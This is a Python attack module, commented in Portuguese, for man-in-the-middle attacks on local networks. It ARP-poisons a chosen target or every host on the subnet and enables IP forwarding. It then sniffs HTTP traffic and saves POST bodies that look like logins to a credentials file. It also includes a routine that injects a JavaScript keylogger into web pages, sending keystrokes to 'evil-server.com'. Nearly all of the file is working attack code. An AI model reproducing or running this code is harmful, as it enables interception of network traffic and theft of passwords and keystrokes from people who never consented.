#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Módulo para realizar ataques Man-in-the-Middle (MITM).
Este módulo permite interceptar e manipular o tráfego entre dispositivos em uma rede.
"""

import os
import sys
import time
import threading
import subprocess
import platform
import re
import netifaces
import logging
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.http import HTTPRequest, HTTPResponse
import multiprocessing
import ctypes

# Importa módulos internos
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
try:
    from src.core.logger import Logger
    from src.utils.helpers import is_admin, find_available_port, check_port_in_use, get_network_interfaces
except ImportError:
    # Caso esteja sendo executado diretamente
    sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
    from core.logger import Logger
    from utils.helpers import is_admin, find_available_port, check_port_in_use, get_network_interfaces

class MITMAttack:
    """Classe para realizar ataques Man-in-the-Middle."""
    
    def __init__(self, interface=None, gateway=None, target=None, sniff=True, inject=False, logger=None):
        """
        Inicializa o ataque MITM.
        
        Args:
            interface (str): Interface de rede a ser utilizada.
            gateway (str): Endereço IP do gateway (roteador).
            target (str): Endereço IP do alvo (se None, ataca toda a rede).
            sniff (bool): Se True, captura tráfego enquanto executa o ataque.
            inject (bool): Se True, prepara para injeção de código em tráfego HTTP.
            logger (Logger): Instância do logger para registrar eventos.
        """
        self.interface = interface
        self.gateway_ip = gateway
        self.target_ip = target
        self.should_sniff = sniff
        self.should_inject = inject
        self.logger = logger if logger else Logger(verbose=True)
        
        # IPs e MACs
        self.gateway_mac = None
        self.target_mac = None
        self.attacker_ip = None
        self.attacker_mac = None
        
        # Estado de execução
        self.running = False
        self.packet_count = 0
        self.captured_credentials = []
        self.intercepted_hosts = set()
        
        # Threads
        self.arp_thread = None
        self.sniff_thread = None
        
        # Detecta o sistema operacional
        self.os_type = platform.system().lower()
        
        # Verifica privilégios
        if not is_admin():
            if self.os_type == "windows":
                self.logger.error("É necessário executar como Administrador para ataques MITM no Windows.")
            else:
                self.logger.error("É necessário executar como root para ataques MITM no Linux.")
            raise PermissionError("Privilégios de administrador necessários")
            
        # Verifica compatibilidade
        if self.os_type == "windows":
            self.logger.warning("Aviso: Ataques MITM têm funcionalidade limitada no Windows.")
        
        # Configuração inicial da interface
        self._setup_interface_info()
    
    def _setup_interface_info(self):
        """Configura informações da interface de rede."""
        try:
            if not self.interface:
                self.logger.error("Interface de rede não especificada.")
                return
            
            # No Windows, vamos tentar obter o nome real da interface que corresponde ao
            # nome amigável que o usuário forneceu
            real_interface = self.interface
            if self.os_type == "windows":
                # Obtém todas as interfaces de rede
                available_interfaces = get_network_interfaces()
                
                # Procura pela interface que corresponde ao nome fornecido
                interface_found = False
                for iface_info in available_interfaces:
                    if self.interface.lower() in iface_info['name'].lower():
                        self.attacker_ip = iface_info['ip']
                        self.attacker_mac = iface_info['mac']
                        real_interface = iface_info['name']
                        interface_found = True
                        self.logger.info(f"Interface encontrada: {real_interface} (IP: {self.attacker_ip}, MAC: {self.attacker_mac})")
                        break
                
                if not interface_found:
                    self.logger.error(f"Interface {self.interface} não encontrada.")
                    return
            else:
                # Em sistemas Unix, o nome da interface é mais direto
                # Obtém endereço IP e MAC da interface
                if real_interface in netifaces.interfaces():
                    if netifaces.AF_INET in netifaces.ifaddresses(real_interface):
                        self.attacker_ip = netifaces.ifaddresses(real_interface)[netifaces.AF_INET][0]['addr']
                    else:
                        self.logger.error(f"Interface {real_interface} não possui endereço IP.")
                        self.attacker_ip = None
                    
                    if netifaces.AF_LINK in netifaces.ifaddresses(real_interface):
                        self.attacker_mac = netifaces.ifaddresses(real_interface)[netifaces.AF_LINK][0]['addr']
                    else:
                        self.logger.error(f"Interface {real_interface} não possui endereço MAC.")
                        self.attacker_mac = None
                else:
                    self.logger.error(f"Interface {real_interface} não encontrada.")
                    self.attacker_ip = None
                    self.attacker_mac = None
            
            # Atualiza o nome da interface para o nome real
            self.interface = real_interface
                
            # Se o gateway não foi especificado, tenta obter automaticamente
            if not self.gateway_ip:
                try:
                    if self.os_type == "windows":
                        # No Windows, pode-se extrair o gateway com ipconfig
                        output = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
                        for line in output.splitlines():
                            if "Default Gateway" in line or "Gateway padrão" in line:
                                gateway_match = re.search(r':\s*([\d\.]+)', line)
                                if gateway_match:
                                    self.gateway_ip = gateway_match.group(1)
                                    self.logger.info(f"Gateway encontrado automaticamente: {self.gateway_ip}")
                                    break
                    else:
                        # Em sistemas Unix, usamos netifaces
                        gateways = netifaces.gateways()
                        if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                            self.gateway_ip = gateways['default'][netifaces.AF_INET][0]
                            self.logger.info(f"Gateway encontrado automaticamente: {self.gateway_ip}")
                except Exception as e:
                    self.logger.error(f"Erro ao encontrar gateway: {e}")
            
            # Obtém o endereço MAC do gateway
            self.gateway_mac = None
            
            # Verifica se conseguimos obter todas as informações necessárias
            if not self.attacker_ip or not self.attacker_mac or not self.gateway_ip:
                self.logger.error("Não foi possível obter todas as informações necessárias para o ataque MITM.")
            
        except Exception as e:
            self.logger.error(f"Erro ao configurar informações da interface: {e}")
    
    def _get_mac(self, ip):
        """
        Obtém o endereço MAC de um IP usando ARP.
        
        Args:
            ip (str): Endereço IP alvo.
            
        Returns:
            str: Endereço MAC ou None se não encontrado.
        """
        try:
            if self.os_type == "windows":
                # No Windows, obtém o MAC usando arp -a
                output = subprocess.run(f"arp -a {ip}", shell=True, capture_output=True, text=True).stdout
                for line in output.splitlines():
                    if ip in line:
                        # Extrai o MAC da linha
                        mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                        if mac_match:
                            return mac_match.group(0).replace('-', ':').lower()
                
                # Se não encontrou com arp, tenta com getmac (disponível no Windows)
                output = subprocess.run(f"getmac /S {ip}", shell=True, capture_output=True, text=True).stdout
                mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', output)
                if mac_match:
                    return mac_match.group(0).replace('-', ':').lower()
            
            # Método usando scapy (funciona em todos os sistemas)
            # Cria pacote ARP request
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            
            # Envia o pacote e obtém a resposta
            response = srp1(arp_request, timeout=2, verbose=False, iface=self.interface)
            
            if response:
                return response.hwsrc
            
            # Método alternativo usando arping do scapy
            responses, _ = arping(ip, verbose=False, iface=self.interface)
            if responses:
                return responses[0][1].hwsrc
                
            return None
        except Exception as e:
            self.logger.error(f"Erro ao obter MAC para o IP {ip}: {e}")
            return None
    
    def _arp_poison(self, target_ip, target_mac, spoof_ip):
        """
        Envia um pacote ARP falso para envenenar a tabela ARP do alvo.
        
        Args:
            target_ip (str): Endereço IP do alvo.
            target_mac (str): Endereço MAC do alvo.
            spoof_ip (str): Endereço IP a ser falsificado (geralmente o gateway).
        """
        try:
            # Cria um pacote ARP de resposta falso
            # Diz ao alvo que o spoof_ip está no nosso MAC
            arp_response = ARP(
                op=2,  # arp response
                pdst=target_ip,  # IP alvo
                hwdst=target_mac,  # MAC alvo
                psrc=spoof_ip,  # Fingindo ser o IP do gateway
                hwsrc=self.attacker_mac  # Nosso MAC
            )
            
            # Envia o pacote
            send(arp_response, verbose=False, iface=self.interface)
        except Exception as e:
            self.logger.error(f"Erro ao enviar pacote ARP falso: {e}")
    
    def _restore_arp(self, target_ip, target_mac, source_ip, source_mac):
        """
        Restaura as tabelas ARP dos dispositivos.
        
        Args:
            target_ip (str): Endereço IP do alvo.
            target_mac (str): Endereço MAC do alvo.
            source_ip (str): Endereço IP da fonte (gateway).
            source_mac (str): Endereço MAC da fonte (gateway).
        """
        try:
            # Cria um pacote ARP para restaurar a tabela ARP correta
            arp_response = ARP(
                op=2,  # arp response
                pdst=target_ip,  # IP alvo
                hwdst=target_mac,  # MAC alvo
                psrc=source_ip,  # IP do gateway
                hwsrc=source_mac  # MAC do gateway
            )
            
            # Envia o pacote várias vezes para garantir
            send(arp_response, count=5, verbose=False, iface=self.interface)
        except Exception as e:
            self.logger.error(f"Erro ao restaurar tabela ARP: {e}")
    
    def _arp_spoof_thread(self):
        """Thread para enviar pacotes ARP falsos continuamente."""
        try:
            self.logger.info("Iniciando envenenamento ARP...")
            
            # Obtém MAC do gateway
            if not self.gateway_mac:
                self.gateway_mac = self._get_mac(self.gateway_ip)
                if not self.gateway_mac:
                    self.logger.error(f"Não foi possível obter o MAC do gateway {self.gateway_ip}.")
                    return
            
            # Se não houver um alvo específico, obtém todos os IPs da rede
            targets = []
            if self.target_ip:
                # Obtém MAC do alvo
                target_mac = self._get_mac(self.target_ip)
                if not target_mac:
                    self.logger.error(f"Não foi possível obter o MAC do alvo {self.target_ip}.")
                    return
                targets.append((self.target_ip, target_mac))
            else:
                # Escaneia a rede para encontrar alvos
                # Exemplo: para a rede 192.168.1.0/24
                network = self.attacker_ip.rsplit('.', 1)[0] + '.0/24'
                self.logger.info(f"Escaneando rede {network} para encontrar alvos...")
                
                try:
                    # Usa arping do scapy para encontrar hosts
                    responses, _ = arping(network, verbose=False, timeout=3, iface=self.interface)
                    for response in responses:
                        ip = response[1].psrc
                        mac = response[1].hwsrc
                        
                        # Não envenenar nossa própria máquina ou o gateway
                        if ip != self.attacker_ip and ip != self.gateway_ip:
                            targets.append((ip, mac))
                            self.logger.debug(f"Alvo encontrado: {ip} ({mac})")
                except Exception as e:
                    self.logger.error(f"Erro ao escanear rede: {e}")
                    return
            
            if not targets:
                self.logger.error("Nenhum alvo encontrado para o ataque.")
                return
            
            self.logger.info(f"Iniciando envenenamento ARP para {len(targets)} alvos...")
            
            # Ativa o IP forwarding
            if sys.platform.startswith('linux'):
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            elif sys.platform == 'darwin':  # macOS
                os.system("sudo sysctl -w net.inet.ip.forwarding=1")
            elif sys.platform == 'win32':
                # No Windows isso é mais complicado, geralmente feito pelo próprio programa
                pass
            
            # Loop de envenenamento
            self.running = True
            while self.running:
                # Para cada alvo, envenena em ambas as direções
                for target_ip, target_mac in targets:
                    # Diz ao alvo que somos o gateway
                    self._arp_poison(target_ip, target_mac, self.gateway_ip)
                    
                    # Diz ao gateway que somos o alvo
                    self._arp_poison(self.gateway_ip, self.gateway_mac, target_ip)
                
                time.sleep(2)  # Atualiza a cada 2 segundos
            
            # Restaura as tabelas ARP quando terminar
            self.logger.info("Restaurando tabelas ARP...")
            for target_ip, target_mac in targets:
                self._restore_arp(target_ip, target_mac, self.gateway_ip, self.gateway_mac)
                self._restore_arp(self.gateway_ip, self.gateway_mac, target_ip, target_mac)
            
            self.running = False
            self.logger.success("Tabelas ARP restauradas.")
            
        except Exception as e:
            self.logger.error(f"Erro no thread de envenenamento ARP: {e}")
            self.running = False
    
    def _packet_processor(self, packet):
        """
        Processa pacotes capturados e extrai informações.
        
        Args:
            packet (Packet): Pacote capturado pelo scapy.
        """
        try:
            self.packet_count += 1
            
            # Analisa pacotes HTTP
            if packet.haslayer(TCP) and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
                if packet.haslayer(HTTPRequest):
                    # Extrai informações da requisição HTTP
                    host = packet[HTTPRequest].Host.decode() if hasattr(packet[HTTPRequest], 'Host') else "?"
                    path = packet[HTTPRequest].Path.decode() if hasattr(packet[HTTPRequest], 'Path') else "?"
                    method = packet[HTTPRequest].Method.decode() if hasattr(packet[HTTPRequest], 'Method') else "?"
                    
                    # Logs
                    self.logger.info(f"[HTTP] {packet[IP].src} -> {host}{path} ({method})")
                    
                    # Armazena a requisição
                    request_info = {
                        'timestamp': time.time(),
                        'src_ip': packet[IP].src,
                        'dst_ip': packet[IP].dst,
                        'host': host,
                        'path': path,
                        'method': method,
                        'headers': {},
                        'body': None
                    }
                    
                    # Extrai headers
                    for field in packet[HTTPRequest].fields:
                        if field != 'Method' and field != 'Path' and field != 'Http-Version':
                            value = getattr(packet[HTTPRequest], field)
                            if value and hasattr(value, 'decode'):
                                request_info['headers'][field] = value.decode()
                    
                    # Verifica credenciais em requisições POST
                    if packet.haslayer(Raw) and method == "POST":
                        payload = packet[Raw].load.decode(errors='ignore')
                        request_info['body'] = payload
                        
                        # Procura por padrões de credenciais
                        if 'password' in payload.lower() or 'user' in payload.lower() or 'login' in payload.lower() or 'senha' in payload.lower():
                            self.logger.success(f"[CREDENCIAIS] {host}: {payload}")
                            self.captured_credentials.append({
                                'source': f"{host}{path}",
                                'method': method,
                                'field': 'password',
                                'value': payload,
                                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                            })
                    
                    self.logger.info(f"Requisição capturada: {host}{path}")
            
            # Analisa pacotes HTTPS (apenas para logging)
            elif packet.haslayer(TCP) and (packet[TCP].dport == 443 or packet[TCP].sport == 443):
                if packet[TCP].flags & 0x02:  # SYN flag
                    self.logger.debug(f"[HTTPS] Conexão iniciada: {packet[IP].src} -> {packet[IP].dst}")
        except Exception as e:
            self.logger.error(f"Erro ao processar pacote: {e}")
    
    def _inject_code(self, packet):
        """
        Injeta código JavaScript em páginas HTML.
        
        Args:
            packet (Packet): Pacote HTTP a ser modificado.
        """
        try:
            # Script de exemplo (coletor de keystrokes, apenas como exemplo)
            # Em um ataque real, isso seria mais sofisticado
            evil_script = b"""
            <script>
            // Script injetado pelo MITM
            document.addEventListener('keypress', function(e) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://evil-server.com/log?key=' + e.key, true);
                xhr.send();
            });
            </script>
            """
            
            # Modifica o pacote original
            modified_load = packet[Raw].load.replace(b'</body>', evil_script + b'</body>')
            
            # Cria um novo pacote com o payload modificado
            new_packet = packet.copy()
            new_packet[Raw].load = modified_load
            
            # Ajusta o tamanho do pacote
            if new_packet.haslayer(IP):
                del new_packet[IP].len
            if new_packet.haslayer(TCP):
                del new_packet[TCP].chksum
            
            # Envia o pacote modificado
            send(new_packet, verbose=False)
            self.logger.success(f"Código injetado em resposta para {packet[IP].dst}")
        except Exception as e:
            self.logger.error(f"Erro ao injetar código: {e}")
    
    def _sniff_traffic(self):
        """Inicia a captura de tráfego."""
        try:
            self.logger.info(f"Iniciando sniffing de tráfego na interface {self.interface}...")
            
            # Define filtro para o alvo específico, se houver
            filter_str = ""
            if self.target_ip:
                filter_str = f"host {self.target_ip}"
            
            # Inicia a captura de pacotes
            sniff(
                iface=self.interface,
                prn=self._packet_processor,
                filter=filter_str,
                store=False
            )
        except Exception as e:
            self.logger.error(f"Erro ao iniciar sniffing de tráfego: {e}")
    
    def start_attack(self):
        """
        Inicia o ataque MITM.
        
        Returns:
            bool: True se o ataque foi iniciado com sucesso, False caso contrário.
        """
        # Verifica os parâmetros
        if not self.interface or not self.attacker_ip or not self.attacker_mac:
            self.logger.error("Interface não configurada corretamente.")
            return False
        
        if not self.gateway_ip:
            self.logger.error("Gateway não especificado e não foi possível detectá-lo automaticamente.")
            return False
        
        try:
            self.running = True
            self.logger.attack(f"Iniciando ataque MITM na interface {self.interface}...")
            
            # Inicia o thread de envenenamento ARP
            arp_thread = threading.Thread(target=self._arp_spoof_thread)
            arp_thread.daemon = True
            arp_thread.start()
            
            # Aguarda o envenenamento começar
            time.sleep(2)
            
            if not self.running:
                self.logger.error("Falha ao iniciar envenenamento ARP.")
                return False
            
            # Inicia o sniffing de tráfego, se solicitado
            if self.should_sniff:
                # Usa um processo separado para o sniffing, pois scapy pode bloquear a thread principal
                self.sniff_thread = threading.Thread(target=self._sniff_traffic)
                self.sniff_thread.daemon = True
                self.sniff_thread.start()
            
            self.logger.success("Ataque MITM iniciado com sucesso.")
            self.logger.info("Pressione Ctrl+C para interromper o ataque.")
            
            # Aguarda o user interromper o ataque (normalmente via Ctrl+C)
            try:
                while self.running:
                    time.sleep(1)
                    
                    # Exibe estatísticas a cada 30 segundos
                    if self.running and self.packet_count > 0 and time.time() % 30 < 1:
                        hosts = len(self.intercepted_hosts)
                        creds = len(self.captured_credentials)
                        self.logger.info(f"Estatísticas: {hosts} hosts interceptados, {self.packet_count} pacotes processados, {creds} credenciais capturadas")
                        
            except KeyboardInterrupt:
                self.logger.info("Interrompendo ataque MITM...")
                self.stop_attack()
            
            return True
        except Exception as e:
            self.logger.error(f"Erro ao iniciar ataque MITM: {e}")
            self.stop_attack()
            return False
    
    def stop_attack(self):
        """Para o ataque MITM e limpa os recursos."""
        if not self.running:
            return
        
        self.logger.info("Parando ataque MITM...")
        self.running = False
        
        # Espera o envenenamento ARP terminar
        time.sleep(3)
        
        # Para o processo de sniffing
        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.terminate()
            self.sniff_thread.join(2)
        
        # Desativa o IP forwarding
        if sys.platform.startswith('linux'):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        elif sys.platform == 'darwin':  # macOS
            os.system("sudo sysctl -w net.inet.ip.forwarding=0")
        
        # Salva credenciais capturadas, se houver
        if self.captured_credentials:
            self.logger.success(f"Capturadas {len(self.captured_credentials)} credenciais durante o ataque.")
            self._save_credentials()
        
        self.logger.success("Ataque MITM finalizado.")
        
    def _save_credentials(self):
        """Salva as credenciais capturadas em um arquivo."""
        try:
            credentials_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), 'captured')
            
            # Cria o diretório se não existir
            os.makedirs(credentials_dir, exist_ok=True)
            
            # Nome do arquivo com timestamp
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            credentials_file = os.path.join(credentials_dir, f"mitm_credentials_{timestamp}.txt")
            
            # Salva as credenciais
            with open(credentials_file, 'w') as f:
                f.write(f"=== Credenciais Capturadas via MITM - {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
                
                for cred in self.captured_credentials:
                    f.write(f"Timestamp: {cred['timestamp']}\n")
                    f.write(f"Fonte: {cred['source']}\n")
                    f.write(f"Método: {cred['method']}\n")
                    f.write(f"Campo: {cred['field']}\n")
                    f.write(f"Valor: {cred['value']}\n")
                    f.write("\n" + ("-" * 40) + "\n\n")
            
            self.logger.info(f"Credenciais salvas em {credentials_file}")
            
        except Exception as e:
            self.logger.error(f"Erro ao salvar credenciais: {e}")
    
    def get_captured_credentials(self):
        """
        Obtém as credenciais capturadas.
        
        Returns:
            list: Lista de credenciais capturadas.
        """
        return self.captured_credentials
    
    def get_stats(self):
        """
        Obtém estatísticas do ataque.
        
        Returns:
            dict: Dicionário com estatísticas do ataque.
        """
        return {
            'running': self.running,
            'packet_count': self.packet_count,
            'intercepted_hosts': len(self.intercepted_hosts),
            'credentials_count': len(self.captured_credentials)
        } 